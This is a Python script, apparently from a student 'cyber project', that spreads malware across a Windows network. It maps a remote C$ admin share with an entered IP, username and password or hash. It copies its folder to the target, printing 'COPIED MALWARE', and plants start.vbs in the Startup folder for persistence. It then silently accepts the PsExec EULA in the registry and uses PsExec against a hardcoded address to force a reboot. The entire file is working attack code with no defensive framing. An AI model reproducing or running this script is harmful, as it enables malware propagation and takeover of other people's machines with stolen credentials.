import os

if __name__ == '__main__':
    path = os.getcwd()
    print(path)
    # path = path[:path.rindex(r'\l')]
    print(path)
    ip = input("enter IP")
    print(ip)
    user = input("enter username")
    print(user)
    password = input("enter hash")
    print(password)
    run = True
    while run:
        try:
            os.popen('Net use * /delete /Y').read()
            print('STARTING')
            os.popen(r"Net use h: \\" + ip + r"\c$ /user:" + user + r" " + password + " /p:yes").read()
            print("CONNECTED")
            run = False
        except:
            print("didn't initiate connection")
    run = True
    while run:
        try:
            print(str(os.popen(
                r'xcopy "' + path + r'"\*.* "h:\SilentButDeadly(CyberProject)\LateralMovement"  /E /H /C /I /Y').read()))
            print("COPIED MALWARE")
            print(str(os.popen(r'copy start.vbs "h:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" /Y')))
            print('COPIED STARTUP')
            run = False
        except:
            print("didn't copy malware")
    run = True
    while run:
        try:
            print(str(os.popen('reg.exe ADD HKCU\Software\Sysinternals\PSexec /v EulaAccepted /t REG_DWORD /d 1 /f')))
            print(str(os.popen(
                r'Psexec \\192.168.68.125 -u ' + user + ' -p ' + password + ' -w c:\SilentButDeadly(CyberProject)\LateralMovement -s -i shutdown /r').read()))
            print('DONE')
            run = False
        except:
            print('failed to run')
    os.popen('Net use * /delete /Y').read()
    print('DONE')
